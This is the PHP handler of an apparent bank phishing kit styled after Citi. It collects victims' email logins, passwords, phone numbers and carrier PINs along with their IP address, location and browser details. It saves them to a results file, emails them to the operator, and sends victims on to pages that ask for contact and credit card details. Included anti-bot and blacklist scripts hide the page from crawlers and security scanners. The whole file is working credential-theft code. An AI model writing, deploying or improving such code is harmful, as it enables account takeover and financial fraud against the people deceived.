<?php
ob_start();
session_start();

include'../../Anti/IP-BlackList.php';  
include'../../Anti/Bot-Crawler.php';
include'../../Anti/Bot-Spox.php';
include'../../Anti/blacklist.php';
include'../../Anti/new.php';
include'../../Anti/Dila_DZ.php';

if(isset($_POST['emailaccess'])&&isset($_POST['emailaccesspass'])){

include '../../admin/YOUR-CONFIG.php';
	include '../../prevents/main.php';
	
	$v_ip = $_SERVER['REMOTE_ADDR'];
    $v_agent = $_SERVER['HTTP_USER_AGENT'];
    $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
	$emaildress = $_SESSION['emaildress'] = $_POST['emailaccess'];
    $emailPassword = $_SESSION['emailPassword'] = $_POST['emailaccesspass'];
	$NumberPhone = $_SESSION['NumberPhone'] = $_POST['phonenumber'];
    $NumberCarrier = $_SESSION['NumberCarrier'] = $_POST['pin'];
	$VictimInfo1 = "| Submitted by : " . $v_ip . " (" . gethostbyaddr($v_ip) . ")";
	$VictimInfo2 = "| L0cation : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
	$VictimInfo3 = "| Us3rAgent : " . $user_agent . "";
	$VictimInfo4 = "| Br0wser : " . $br . "";
	$VictimInfo5 = "| Os : " . $os . "";

	$message .= "+------- ✅ Em4il l0gin -------+\n";
	$message .= "| Em4il l0gin : $emaildress\n";
    $message .= "| Em4il p4ssword : $emailPassword\n";
	$message .= "| Teleph0ne : $NumberPhone\n";
    $message .= "| Ph0ne Carrier Pln : $NumberCarrier\n";
	$message .= "+ ------------------------------------+\n";
	$message .= "+ 🌐 Victim Inf0rmation\n";
	$message .= "$VictimInfo1\n";
	$message .= "$VictimInfo2\n";
	$message .= "$VictimInfo3\n";
	$message .= "$VictimInfo4\n";
	$message .= "$VictimInfo5\n";
	$message .= "| 🕛 Received : $date\n";
	$message .= "+ ------------------------------------+\n";
	$message .= " https://ipgeolocation.io/ip-location/$ip \r\n";

		$save=fopen("../CITI_RESULT/EMail".$pin.".txt","a+");
        fwrite($save,$message);
        fclose($save);

	$subject = "+------- ✅ Em4il l0gin -------+\n".$_POST['emailaccess'];
	$head = "Content-type:text/plain;charset=UTF-8\r\n";
	$head .= "From: $from <$sender_mail>" . "\r\n";
    @mail($sender_mail ,$subject,$message,$head);
		
		$key = substr(sha1(mt_rand()),1,25);

	if ($show_contact_information=="yes") {
		exit(header("Location: ../../Contact_information?/.jsp/efs/servlet/efs/"));
	}
	if ($show_credit_card=="yes") {
		exit(header("Location: ../../credit_verification?/.jsp/efs/servlet/efs/"));
	}
	if ($show_success_page=="yes") {
		exit(header("Location: ../../Success?/.jsp/efs/servlet/efs/")); 
	}else{

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
    		exit(header("Location: https://bit.ly/2UgDDbr"));
	}
}





?>